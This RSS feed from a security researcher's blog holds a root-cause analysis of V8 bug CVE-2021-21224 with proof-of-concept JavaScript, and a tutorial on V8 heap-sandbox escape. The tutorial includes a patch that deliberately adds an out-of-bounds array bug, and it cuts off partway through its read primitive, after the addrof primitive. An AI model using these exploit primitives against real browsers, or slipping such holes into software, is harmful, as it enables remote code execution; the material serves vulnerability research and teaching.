<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>Posts on Anvbis</title><link>https://anvbis.github.io/posts/</link><description>Recent content in Posts on Anvbis</description><generator>Hugo -- gohugo.io</generator><language>en-au</language><copyright>Anvbis</copyright><lastBuildDate>Tue, 06 Dec 2022 00:00:00 +0000</lastBuildDate><atom:link href="https://anvbis.github.io/posts/index.xml" rel="self" type="application/rss+xml"/><item><title>Root Cause Analysis of CVE-2021-21224</title><link>https://anvbis.github.io/posts/root-cause-analysis-of-cve-2021-21224/</link><pubDate>Tue, 06 Dec 2022 00:00:00 +0000</pubDate><guid>https://anvbis.github.io/posts/root-cause-analysis-of-cve-2021-21224/</guid><description>1. Overview An incorrect optimization in TurboFan&amp;rsquo;s typer results in Int64 values being erroneously truncated to Int32 values.
2. Patch Implementation Details [compiler] Fix bug in RepresentationChanger::GetWord32RepresentationFor We have to respect the TypeCheckKind.
diff --git a/src/compiler/representation-change.cc b/src/compiler/representation-change.cc index 64b274c..3d937ad 100644 --- a/src/compiler/representation-change.cc +++ b/src/compiler/representation-change.cc @@ -949,10 +949,10 @@ return node; } else if (output_rep == MachineRepresentation::kWord64) { if (output_type.Is(Type::Signed32()) || - output_type.Is(Type::Unsigned32())) { - op = machine()-&amp;gt;TruncateInt64ToInt32(); - } else if (output_type.</description><content>&lt;h2 id="1-overview">1. Overview&lt;/h2>
&lt;p>An incorrect optimization in TurboFan&amp;rsquo;s typer results in Int64 values being erroneously truncated to Int32 values.&lt;/p>
&lt;h2 id="2-patch-implementation-details">2. Patch Implementation Details&lt;/h2>
&lt;blockquote>
&lt;p>[compiler] Fix bug in RepresentationChanger::GetWord32RepresentationFor
We have to respect the TypeCheckKind.&lt;/p>
&lt;/blockquote>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-diff" data-lang="diff">diff --git a/src/compiler/representation-change.cc b/src/compiler/representation-change.cc
index 64b274c..3d937ad 100644
&lt;span style="color:#f92672">--- a/src/compiler/representation-change.cc
&lt;/span>&lt;span style="color:#f92672">&lt;/span>&lt;span style="color:#a6e22e">+++ b/src/compiler/representation-change.cc
&lt;/span>&lt;span style="color:#a6e22e">&lt;/span>&lt;span style="color:#75715e">@@ -949,10 +949,10 @@
&lt;/span>&lt;span style="color:#75715e">&lt;/span> return node;
} else if (output_rep == MachineRepresentation::kWord64) {
if (output_type.Is(Type::Signed32()) ||
&lt;span style="color:#f92672">- output_type.Is(Type::Unsigned32())) {
&lt;/span>&lt;span style="color:#f92672">- op = machine()-&amp;gt;TruncateInt64ToInt32();
&lt;/span>&lt;span style="color:#f92672">- } else if (output_type.Is(cache_-&amp;gt;kSafeInteger) &amp;amp;&amp;amp;
&lt;/span>&lt;span style="color:#f92672">- use_info.truncation().IsUsedAsWord32()) {
&lt;/span>&lt;span style="color:#f92672">&lt;/span>&lt;span style="color:#a6e22e">+ (output_type.Is(Type::Unsigned32()) &amp;amp;&amp;amp;
&lt;/span>&lt;span style="color:#a6e22e">+ use_info.type_check() == TypeCheckKind::kNone) ||
&lt;/span>&lt;span style="color:#a6e22e">+ (output_type.Is(cache_-&amp;gt;kSafeInteger) &amp;amp;&amp;amp;
&lt;/span>&lt;span style="color:#a6e22e">+ use_info.truncation().IsUsedAsWord32())) {
&lt;/span>&lt;span style="color:#a6e22e">&lt;/span> op = machine()-&amp;gt;TruncateInt64ToInt32();
} else if (use_info.type_check() == TypeCheckKind::kSignedSmall ||
use_info.type_check() == TypeCheckKind::kSigned32 ||
&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="3-proof-of-concept">3. Proof of Concept&lt;/h2>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-js" data-lang="js">&lt;span style="color:#75715e">/* supplied poc */&lt;/span>
&lt;span style="color:#66d9ef">function&lt;/span> &lt;span style="color:#a6e22e">foo&lt;/span>(&lt;span style="color:#a6e22e">a&lt;/span>) {
&lt;span style="color:#66d9ef">let&lt;/span> &lt;span style="color:#a6e22e">y&lt;/span> &lt;span style="color:#f92672">=&lt;/span> (&lt;span style="color:#66d9ef">new&lt;/span> Date(&lt;span style="color:#ae81ff">42&lt;/span>)).&lt;span style="color:#a6e22e">getMilliseconds&lt;/span>();
&lt;span style="color:#66d9ef">let&lt;/span> &lt;span style="color:#a6e22e">i&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>;
&lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#a6e22e">a&lt;/span>) &lt;span style="color:#a6e22e">i&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0xffffffff&lt;/span>;
&lt;span style="color:#66d9ef">return&lt;/span> Math.&lt;span style="color:#a6e22e">max&lt;/span>(&lt;span style="color:#ae81ff">1&lt;/span> &lt;span style="color:#f92672">&amp;lt;&amp;lt;&lt;/span> &lt;span style="color:#a6e22e">y&lt;/span>, &lt;span style="color:#a6e22e">i&lt;/span>, &lt;span style="color:#ae81ff">1&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#a6e22e">y&lt;/span>) &lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#a6e22e">y&lt;/span>;
}
&lt;span style="color:#a6e22e">console&lt;/span>.&lt;span style="color:#a6e22e">log&lt;/span>(&lt;span style="color:#a6e22e">foo&lt;/span>(&lt;span style="color:#66d9ef">true&lt;/span>)); &lt;span style="color:#75715e">/* true */&lt;/span>
&lt;span style="color:#f92672">%&lt;/span>&lt;span style="color:#a6e22e">PrepareFunctionForOptimization&lt;/span>(&lt;span style="color:#a6e22e">foo&lt;/span>);
&lt;span style="color:#a6e22e">foo&lt;/span>(&lt;span style="color:#66d9ef">false&lt;/span>);
&lt;span style="color:#f92672">%&lt;/span>&lt;span style="color:#a6e22e">OptimizeFunctionOnNextCall&lt;/span>(&lt;span style="color:#a6e22e">foo&lt;/span>);
&lt;span style="color:#a6e22e">console&lt;/span>.&lt;span style="color:#a6e22e">log&lt;/span>(&lt;span style="color:#a6e22e">foo&lt;/span>(&lt;span style="color:#66d9ef">true&lt;/span>)); &lt;span style="color:#75715e">/* false */&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>In the process of investigating this bug, I also managed to produce this much simpler proof-of-concept. This is what I&amp;rsquo;ll be using for further analysis - at the very least, a simpler proof-of-concept means a simpler Turbolizer graph.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-js" data-lang="js">&lt;span style="color:#75715e">/* simplified poc */&lt;/span>
&lt;span style="color:#66d9ef">function&lt;/span> &lt;span style="color:#a6e22e">foo&lt;/span>(&lt;span style="color:#a6e22e">a&lt;/span>) {
&lt;span style="color:#66d9ef">let&lt;/span> &lt;span style="color:#a6e22e">i&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">0xffffffff&lt;/span>;
&lt;span style="color:#66d9ef">if&lt;/span> (&lt;span style="color:#a6e22e">a&lt;/span>) &lt;span style="color:#a6e22e">i&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>;
&lt;span style="color:#66d9ef">let&lt;/span> &lt;span style="color:#a6e22e">z&lt;/span> &lt;span style="color:#f92672">=&lt;/span> Math.&lt;span style="color:#a6e22e">max&lt;/span>(&lt;span style="color:#ae81ff">0&lt;/span>, &lt;span style="color:#a6e22e">i&lt;/span>);
&lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#ae81ff">0&lt;/span> &lt;span style="color:#f92672">-&lt;/span> &lt;span style="color:#a6e22e">z&lt;/span>;
}
&lt;span style="color:#a6e22e">console&lt;/span>.&lt;span style="color:#a6e22e">log&lt;/span>(&lt;span style="color:#a6e22e">foo&lt;/span>(&lt;span style="color:#66d9ef">false&lt;/span>)); &lt;span style="color:#75715e">/* -4294967295 */&lt;/span>
&lt;span style="color:#f92672">%&lt;/span>&lt;span style="color:#a6e22e">PrepareFunctionForOptimization&lt;/span>(&lt;span style="color:#a6e22e">foo&lt;/span>);
&lt;span style="color:#a6e22e">foo&lt;/span>(&lt;span style="color:#66d9ef">true&lt;/span>);
&lt;span style="color:#f92672">%&lt;/span>&lt;span style="color:#a6e22e">OptimizeFunctionOnNextCall&lt;/span>(&lt;span style="color:#a6e22e">foo&lt;/span>);
&lt;span style="color:#a6e22e">console&lt;/span>.&lt;span style="color:#a6e22e">log&lt;/span>(&lt;span style="color:#a6e22e">foo&lt;/span>(&lt;span style="color:#66d9ef">false&lt;/span>)); &lt;span style="color:#75715e">/* 1 */&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>What I find particularly interesting about this simplified proof-of-concept is that it doesn&amp;rsquo;t use the left shift operator - while the original bug report states the following.&lt;/p>
&lt;blockquote>
&lt;p>The following PoC generates a V8 incorrect optimization of [the] left shift operator, which leads to [the] optimized function return value to be different than [the] unoptimized function return value.&lt;/p>
&lt;/blockquote>
&lt;p>And yet, our simplified PoC doesn&amp;rsquo;t use the left shift operator at all. My initial assumption is that bug is due to an incorrect optimization in the comparison operator (as TurboFan effectively optimizes the &lt;code>Math.max()&lt;/code> call to an &lt;code>Int64LessThan&lt;/code> node) rather than an incorrect optimization in the left shift operator.&lt;/p>
&lt;p>While I might be completely wrong, it&amp;rsquo;s definitely a topic that requires further investigation.&lt;/p>
&lt;h2 id="references">References&lt;/h2>
&lt;ul>
&lt;li>&lt;a href="https://bugs.chromium.org/p/chromium/issues/detail?id=1195777">Issue 1195777: Incorrect representation change from Word64 to Word32&lt;/a>&lt;/li>
&lt;/ul></content></item><item><title>Code Execution in Chromium's V8 Heap Sandbox</title><link>https://anvbis.github.io/posts/code-execution-in-chromiums-v8-heap-sandbox/</link><pubDate>Sun, 27 Nov 2022 00:00:00 +0000</pubDate><guid>https://anvbis.github.io/posts/code-execution-in-chromiums-v8-heap-sandbox/</guid><description>1. Overview The V8 heap sandbox has been around for quite some time now, and while it initially broke several methods used to gain code execution (looking at you, wasm shellcode), new methods have risen to take their place.
I thought it would be worthwile to detail one such method in an article. I&amp;rsquo;ve seen a very limited amount of posts on this particular topic, and what I have seen has been pretty poorly explained.</description><content>&lt;h2 id="1-overview">1. Overview&lt;/h2>
&lt;p>The V8 heap sandbox has been around for quite some time now, and while it initially broke several methods used to gain code execution (looking at you, wasm shellcode), new methods have risen to take their place.&lt;/p>
&lt;p>I thought it would be worthwile to detail one such method in an article. I&amp;rsquo;ve seen a very limited amount of posts on this particular topic, and what I have seen has been pretty poorly explained. This is mostly for my own reference, but anyone is welcome to learn from it.&lt;/p>
&lt;h2 id="2-introducing-the-heap-sandbox">2. Introducing the Heap Sandbox&lt;/h2>
&lt;p>First introduced into V8 around a year ago (at the time of this post), the motivation behind the implementation of the heap sandbox was to limit an attacker&amp;rsquo;s ability to write data outside of V8&amp;rsquo;s heap address-space.&lt;/p>
&lt;p>It primarily performs this through the isolation of all external pointers and references to off-heap objects (e.g. the backing store of an ArrayBuffer object). In the heap sandbox, these pointers are converted to references to an external pointer table, essentially indices of a lookup table.&lt;/p>
&lt;p>Memory corruption outside of V8&amp;rsquo;s heap is considered to be an escape from this sandbox. That definition also covers arbitrary code execution.&lt;/p>
&lt;h3 id="21-exploring-the-sandbox">2.1. Exploring the Sandbox&lt;/h3>
&lt;p>So as previously mentioned, external pointers should be isolated and converted to references to elements of an external pointer table, we can explore what this looks like in practice.&lt;/p>
&lt;p>We can start by allocating two objects, &lt;code>a&lt;/code> and &lt;code>b&lt;/code>, printing debug information, and digging around the memory a little.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-js" data-lang="js">&lt;span style="color:#66d9ef">let&lt;/span> &lt;span style="color:#a6e22e">a&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">ArrayBuffer&lt;/span>(&lt;span style="color:#ae81ff">1337&lt;/span>);
&lt;span style="color:#f92672">%&lt;/span>&lt;span style="color:#a6e22e">DebugPrint&lt;/span>(&lt;span style="color:#a6e22e">a&lt;/span>);
&lt;span style="color:#66d9ef">let&lt;/span> &lt;span style="color:#a6e22e">b&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">ArrayBuffer&lt;/span>(&lt;span style="color:#ae81ff">1337&lt;/span>);
&lt;span style="color:#f92672">%&lt;/span>&lt;span style="color:#a6e22e">DebugPrint&lt;/span>(&lt;span style="color:#a6e22e">b&lt;/span>);
&lt;span style="color:#f92672">%&lt;/span>&lt;span style="color:#a6e22e">SystemBreak&lt;/span>();
&lt;/code>&lt;/pre>&lt;/div>&lt;p>The debug information for these two objects shows that their backing stores are located at &lt;code>0x19fa00000000&lt;/code> and &lt;code>0x19fa00001000&lt;/code> respectively. Interesting that ArrayBuffer objects are effectively allocated an entire page, even if their size is significantly smaller than 4096 bytes.&lt;/p>
&lt;pre>&lt;code>DebugPrint: 0x19f90010ba95: [JSArrayBuffer]
- map: 0x19f90024b945 &amp;lt;Map[68](HOLEY_ELEMENTS)&amp;gt; [FastProperties]
- prototype: 0x19f90024ba19 &amp;lt;Object map = 0x19f90024b96d&amp;gt;
- elements: 0x19f900002259 &amp;lt;FixedArray[0]&amp;gt; [HOLEY_ELEMENTS]
- embedder fields: 2
- backing_store: 0x19fa00000000
- byte_length: 1337
- max_byte_length: 1337
...
DebugPrint: 0x19f90010bad9: [JSArrayBuffer]
- map: 0x19f90024b945 &amp;lt;Map[68](HOLEY_ELEMENTS)&amp;gt; [FastProperties]
- prototype: 0x19f90024ba19 &amp;lt;Object map = 0x19f90024b96d&amp;gt;
- elements: 0x19f900002259 &amp;lt;FixedArray[0]&amp;gt; [HOLEY_ELEMENTS]
- embedder fields: 2
- backing_store: 0x19fa00001000
- byte_length: 1337
- max_byte_length: 1337
...
&lt;/code>&lt;/pre>&lt;p>Viewing these objects in memory, they&amp;rsquo;re almost identical except for one value stored 0x24 bytes from the start of the object, &lt;code>0x01000000&lt;/code> and &lt;code>0x01000010&lt;/code>. It wouldn&amp;rsquo;t be too crazy to think these must be the lookup values for the backing store.&lt;/p>
&lt;pre>&lt;code>pwndbg&amp;gt; x/12dwx 0x19f90010ba95-1
0x19f90010ba94: 0x0024b945 0x00002259 0x00002259 0x000023e1
0x19f90010baa4: 0x20000000 0x000000a7 0x20000000 0x000000a7
0x19f90010bab4: 0x00000000 0x01000000 0xe98c1ea0 0x000055fe
pwndbg&amp;gt; x/12dwx 0x19f90010bad9-1
0x19f90010bad8: 0x0024b945 0x00002259 0x00002259 0x000023e1
0x19f90010bae8: 0x20000000 0x000000a7 0x20000000 0x000000a7
0x19f90010baf8: 0x00000000 0x01000010 0xe98c1f50 0x000055fe
&lt;/code>&lt;/pre>&lt;p>This can easily be verified by setting the memory at that location for object &lt;code>a&lt;/code> to that of &lt;code>b&lt;/code>. Printing the debug information for object &lt;code>a&lt;/code>, it shows that the backing store has updated to that of object &lt;code>b&lt;/code>.&lt;/p>
&lt;p>This proves the initial hypothesis was correct. We&amp;rsquo;ve found the reference value used to perform a lookup on the external pointer table.&lt;/p>
&lt;pre>&lt;code>pwndbg&amp;gt; set *(int32_t *)(0x19f90010ba94+0x24) = 0x01000010
pwndbg&amp;gt; job 0x19f90010ba95
DebugPrint: 0x19f90010ba95: [JSArrayBuffer]
- map: 0x19f90024b945 &amp;lt;Map[68](HOLEY_ELEMENTS)&amp;gt; [FastProperties]
- prototype: 0x19f90024ba19 &amp;lt;Object map = 0x19f90024b96d&amp;gt;
- elements: 0x19f900002259 &amp;lt;FixedArray[0]&amp;gt; [HOLEY_ELEMENTS]
- embedder fields: 2
- backing_store: 0x19fa00001000
- byte_length: 1337
- max_byte_length: 1337
...
&lt;/code>&lt;/pre>&lt;p>I don&amp;rsquo;t want to dive too deep into the internals of the V8 heap sandbox in this article, so I won&amp;rsquo;t go any further for today. But it is good to know that you can replace an object&amp;rsquo;s index with that of another, potentially giving you write access somewhere else external to the heap.&lt;/p>
&lt;h2 id="3-escaping-the-heap-sandbox">3. Escaping the Heap Sandbox&lt;/h2>
&lt;p>Now we move on to actually performing a heap sandbox escape. I&amp;rsquo;ve included a patch for a very, very, very simple array out-of-bounds vulnerability below. I&amp;rsquo;ll be using that to demonstrate the technique.&lt;/p>
&lt;p>Note: If you want to follow along, the commit hash for the build of V8 I&amp;rsquo;m using is &lt;code>bd5b3ae5422e9fa1d0f7a281bbdf709e6db65f62&lt;/code>.&lt;/p>
&lt;h3 id="31-an-example-vulnerability">3.1. An Example Vulnerability&lt;/h3>
&lt;p>As mentioned above, the vulnerability introduced here is very simple. A new JSArray builtin is added that allows you to change the length of an array to any arbitrary value, effectively providing you with out-of-bounds access below the array.&lt;/p>
&lt;div class="collapsable-code">
&lt;input id="1" type="checkbox" checked />
&lt;label for="1">
&lt;span class="collapsable-code__language">diff&lt;/span>
&lt;span class="collapsable-code__title">patch.diff&lt;/span>
&lt;span class="collapsable-code__toggle" data-label-expand="Show" data-label-collapse="Hide">&lt;/span>
&lt;/label>
&lt;pre class="language-diff" >&lt;code>
diff --git a/src/builtins/builtins-array.cc b/src/builtins/builtins-array.cc
index 49fe48d698..2944eb9edb 100644
--- a/src/builtins/builtins-array.cc
&amp;#43;&amp;#43;&amp;#43; b/src/builtins/builtins-array.cc
@@ -395,6 &amp;#43;395,25 @@ BUILTIN(ArrayPush) {
return *isolate-&amp;gt;factory()-&amp;gt;NewNumberFromUint((new_length));
}
&amp;#43;BUILTIN(ArrayLen) {
&amp;#43; uint32_t len = args.length();
&amp;#43; if(len != 2) return ReadOnlyRoots(isolate).undefined_value();
&amp;#43;
&amp;#43; Handle&amp;lt;JSReceiver&amp;gt; receiver;
&amp;#43; ASSIGN_RETURN_FAILURE_ON_EXCEPTION(
&amp;#43; isolate, receiver, Object::ToObject(isolate, args.receiver()));
&amp;#43; Handle&amp;lt;JSArray&amp;gt; array = Handle&amp;lt;JSArray&amp;gt;::cast(receiver);
&amp;#43;
&amp;#43; Handle&amp;lt;Object&amp;gt; argLen;
&amp;#43; ASSIGN_RETURN_FAILURE_ON_EXCEPTION(
&amp;#43; isolate, argLen, Object::ToNumber(isolate, args.at&amp;lt;Object&amp;gt;(1)));
&amp;#43; uint32_t newLen = static_cast&amp;lt;uint32_t&amp;gt;(argLen-&amp;gt;Number());
&amp;#43;
&amp;#43; auto raw = *array;
&amp;#43; raw.set_length(Smi::FromInt(newLen));
&amp;#43; return ReadOnlyRoots(isolate).undefined_value();
&amp;#43;}
&amp;#43;
namespace {
V8_WARN_UNUSED_RESULT Object GenericArrayPop(Isolate* isolate,
diff --git a/src/builtins/builtins-definitions.h b/src/builtins/builtins-definitions.h
index 859b5cee9a..a16a7d5ca1 100644
--- a/src/builtins/builtins-definitions.h
&amp;#43;&amp;#43;&amp;#43; b/src/builtins/builtins-definitions.h
@@ -392,6 &amp;#43;392,7 @@ namespace internal {
CPP(ArrayPrototypeGroupToMap) \
/* ES6 #sec-array.prototype.push */ \
CPP(ArrayPush) \
&amp;#43; CPP(ArrayLen) \
TFJ(ArrayPrototypePush, kDontAdaptArgumentsSentinel) \
/* ES6 #sec-array.prototype.shift */ \
CPP(ArrayShift) \
diff --git a/src/compiler/typer.cc b/src/compiler/typer.cc
index 5888a5cdab..5d13eac799 100644
--- a/src/compiler/typer.cc
&amp;#43;&amp;#43;&amp;#43; b/src/compiler/typer.cc
@@ -1880,6 &amp;#43;1880,8 @@ Type Typer::Visitor::JSCallTyper(Type fun, Typer* t) {
return Type::Receiver();
case Builtin::kArrayPush:
return t-&amp;gt;cache_-&amp;gt;kPositiveSafeInteger;
&amp;#43; case Builtin::kArrayLen:
&amp;#43; return Type::Receiver();
case Builtin::kArrayPrototypeReverse:
case Builtin::kArrayPrototypeSlice:
return Type::Receiver();
diff --git a/src/init/bootstrapper.cc b/src/init/bootstrapper.cc
index 7c7b917502..550b25d4ba 100644
--- a/src/init/bootstrapper.cc
&amp;#43;&amp;#43;&amp;#43; b/src/init/bootstrapper.cc
@@ -1808,6 &amp;#43;1808,8 @@ void Genesis::InitializeGlobal(Handle&amp;lt;JSGlobalObject&amp;gt; global_object,
0, false);
SimpleInstallFunction(isolate_, proto, &amp;#34;push&amp;#34;, Builtin::kArrayPrototypePush,
1, false);
&amp;#43; SimpleInstallFunction(isolate_, proto, &amp;#34;len&amp;#34;, Builtin::kArrayLen,
&amp;#43; 2, false);
SimpleInstallFunction(isolate_, proto, &amp;#34;reverse&amp;#34;,
Builtin::kArrayPrototypeReverse, 0, false);
SimpleInstallFunction(isolate_, proto, &amp;#34;shift&amp;#34;,
&lt;/code>&lt;/pre>
&lt;/div>
&lt;p>Here&amp;rsquo;s some Javascript code that triggers this vulnerability. The &lt;code>len&lt;/code> builtin is called, and sets the length of the array to the value of &lt;code>1337&lt;/code>.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-js" data-lang="js">&lt;span style="color:#66d9ef">let&lt;/span> &lt;span style="color:#a6e22e">a&lt;/span> &lt;span style="color:#f92672">=&lt;/span> [&lt;span style="color:#ae81ff">1.1&lt;/span>, &lt;span style="color:#ae81ff">2.2&lt;/span>];
&lt;span style="color:#a6e22e">a&lt;/span>.&lt;span style="color:#a6e22e">len&lt;/span>(&lt;span style="color:#ae81ff">1337&lt;/span>);
&lt;span style="color:#f92672">%&lt;/span>&lt;span style="color:#a6e22e">DebugPrint&lt;/span>(&lt;span style="color:#a6e22e">a&lt;/span>);
&lt;/code>&lt;/pre>&lt;/div>&lt;p>We can see in the debug information below, that while the array only has two elements the length of the array is &lt;code>1337&lt;/code>, giving us unrestricted out-of-bounds access below it.&lt;/p>
&lt;pre>&lt;code>DebugPrint: 0x27ff0004b9c9: [JSArray]
- map: 0x27ff0018e6bd &amp;lt;Map[16](PACKED_DOUBLE_ELEMENTS)&amp;gt; [FastProperties]
- prototype: 0x27ff0018e11d &amp;lt;JSArray[0]&amp;gt;
- elements: 0x27ff0004b9b1 &amp;lt;FixedDoubleArray[2]&amp;gt; [PACKED_DOUBLE_ELEMENTS]
- length: 1337
- properties: 0x27ff00002259 &amp;lt;FixedArray[0]&amp;gt;
- All own properties (excluding elements): {
0x27ff00006551: [String] in ReadOnlySpace: #length: 0x27ff00144269 &amp;lt;AccessorInfo name= 0x27ff00006551 &amp;lt;String[6]: #length&amp;gt;, data= 0x27ff000023e1 &amp;lt;undefined&amp;gt;&amp;gt; (const accessor descriptor), location: descriptor
}
- elements: 0x27ff0004b9b1 &amp;lt;FixedDoubleArray[2]&amp;gt; {
0: 1.1
1: 2.2
}
...
&lt;/code>&lt;/pre>&lt;h3 id="32-a-few-exploit-primitives">3.2. A Few Exploit Primitives&lt;/h3>
&lt;p>I&amp;rsquo;m not going to go into too much detail here, as there are a lot of resources detailing common V8 exploit primitives. Plus if you&amp;rsquo;re reading this I&amp;rsquo;m assuming you already know a little about V8 exploitation.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-js" data-lang="js">&lt;span style="color:#66d9ef">var&lt;/span> &lt;span style="color:#a6e22e">bs&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> &lt;span style="color:#a6e22e">ArrayBuffer&lt;/span>(&lt;span style="color:#ae81ff">8&lt;/span>);
&lt;span style="color:#66d9ef">var&lt;/span> &lt;span style="color:#a6e22e">fs&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> &lt;span style="color:#a6e22e">Float64Array&lt;/span>(&lt;span style="color:#a6e22e">bs&lt;/span>);
&lt;span style="color:#66d9ef">var&lt;/span> &lt;span style="color:#a6e22e">is&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#66d9ef">new&lt;/span> &lt;span style="color:#a6e22e">BigUint64Array&lt;/span>(&lt;span style="color:#a6e22e">bs&lt;/span>);
&lt;span style="color:#75715e">/* converts a float to a 64-bit uint */&lt;/span>
&lt;span style="color:#66d9ef">function&lt;/span> &lt;span style="color:#a6e22e">ftoi&lt;/span>(&lt;span style="color:#a6e22e">x&lt;/span>) {
&lt;span style="color:#a6e22e">fs&lt;/span>[&lt;span style="color:#ae81ff">0&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">x&lt;/span>;
&lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#a6e22e">is&lt;/span>[&lt;span style="color:#ae81ff">0&lt;/span>];
}
&lt;span style="color:#75715e">/* converts a 64-bit uint to a float */&lt;/span>
&lt;span style="color:#66d9ef">function&lt;/span> &lt;span style="color:#a6e22e">itof&lt;/span>(&lt;span style="color:#a6e22e">x&lt;/span>) {
&lt;span style="color:#a6e22e">is&lt;/span>[&lt;span style="color:#ae81ff">0&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">x&lt;/span>;
&lt;span style="color:#66d9ef">return&lt;/span> &lt;span style="color:#a6e22e">fs&lt;/span>[&lt;span style="color:#ae81ff">0&lt;/span>];
}
&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-js" data-lang="js">&lt;span style="color:#75715e">/* create an oob array */&lt;/span>
&lt;span style="color:#66d9ef">let&lt;/span> &lt;span style="color:#a6e22e">oob&lt;/span> &lt;span style="color:#f92672">=&lt;/span> [&lt;span style="color:#ae81ff">1.1&lt;/span>];
&lt;span style="color:#a6e22e">oob&lt;/span>.&lt;span style="color:#a6e22e">len&lt;/span>(&lt;span style="color:#ae81ff">1337&lt;/span>);
&lt;span style="color:#75715e">/* flt.elements @ oob[6] */&lt;/span>
&lt;span style="color:#66d9ef">let&lt;/span> &lt;span style="color:#a6e22e">flt&lt;/span> &lt;span style="color:#f92672">=&lt;/span> [&lt;span style="color:#ae81ff">1.1&lt;/span>];
&lt;span style="color:#75715e">/* obj.elements @ oob[15] */&lt;/span>
&lt;span style="color:#66d9ef">let&lt;/span> &lt;span style="color:#a6e22e">tmp&lt;/span> &lt;span style="color:#f92672">=&lt;/span> {&lt;span style="color:#a6e22e">a&lt;/span>&lt;span style="color:#f92672">:&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>};
&lt;span style="color:#66d9ef">let&lt;/span> &lt;span style="color:#a6e22e">obj&lt;/span> &lt;span style="color:#f92672">=&lt;/span> [&lt;span style="color:#a6e22e">tmp&lt;/span>];
&lt;span style="color:#75715e">/* addrof primitive */&lt;/span>
&lt;span style="color:#66d9ef">function&lt;/span> &lt;span style="color:#a6e22e">addrof&lt;/span>(&lt;span style="color:#a6e22e">o&lt;/span>) {
&lt;span style="color:#a6e22e">oob&lt;/span>[&lt;span style="color:#ae81ff">6&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">oob&lt;/span>[&lt;span style="color:#ae81ff">15&lt;/span>];
&lt;span style="color:#a6e22e">obj&lt;/span>[&lt;span style="color:#ae81ff">0&lt;/span>] &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">o&lt;/span>;
&lt;span style="color:#66d9ef">return&lt;/span> (&lt;span style="color:#a6e22e">ftoi&lt;/span>(&lt;span style="color:#a6e22e">flt&lt;/span>[&lt;span style="color:#ae81ff">0&lt;/span>]) &lt;span style="color:#f92672">&amp;amp;&lt;/span> &lt;span style="color:#ae81ff">0xffffffff&lt;/span>&lt;span style="color:#a6e22e">n&lt;/span>) &lt;span style="color:#f92672">-&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#a6e22e">n&lt;/span>;
}
&lt;span style="color:#75715e">/* 64-bit read primitive */&lt;/span>
&lt;span style="color:#66d9ef">function&lt;/span> &lt;span style="color:#a6e22e">read&lt;/span>(&lt;span style="color:#a6e22e">p&lt;/span>) {
&lt;span style="color:#66d9ef">let&lt;/span> &lt;span style="color:#a6e22e">a&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#a6e22e">ftoi&lt;/span>(&lt;span style="color:#a6e22e">oob&lt;/span>[&lt;span style="color:#ae81ff">6&lt;/span>]) &lt;span style="color:#f92672">&amp;gt;&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">32&lt;/span>&lt;span style="color:#a6e22e">n&lt;/span>;
